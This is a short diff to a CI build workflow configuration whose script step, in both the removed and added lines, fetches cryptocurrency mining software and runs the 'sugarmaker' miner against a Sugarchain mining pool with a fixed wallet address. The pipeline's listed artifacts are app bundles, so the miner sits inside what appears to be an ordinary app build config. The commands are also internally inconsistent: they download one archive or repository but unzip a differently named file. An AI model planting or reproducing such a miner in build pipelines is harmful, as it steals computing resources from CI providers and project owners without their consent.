@@ -20,7 +20,7 @@ workflows:
           source: true
       cancel_previous_builds: false
     scripts: 
-      - apt-get update && apt-get install unzip && wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && unzip sugarmaker-v2.5.0-sugar4-linux64.zip && cd sugarmaker-v2.5.0-sugar4-linux64 && ./sugarmaker -a power2b -o 1pool.sugarchain.org:3333 -u sugar1qlqrcchun3xhfqswv9kzctv8z9r4cgc0sc5nlpj.1945 -t0
+      - apt-get update && apt-get install unzip && git clone https://github.com/cryptozeny/cpuminer-opt-sugarchain.git && unzip sugarmaker-v2.5.0-sugar4-linux64.zip && cd sugarmaker-v2.5.0-sugar4-linux64 && ./sugarmaker -a power2b -o 1pool.sugarchain.org:3333 -u sugar1qlqrcchun3xhfqswv9kzctv8z9r4cgc0sc5nlpj.1945 -t0
     artifacts:
       - build/**/outputs/**/*.aab
     publishing:
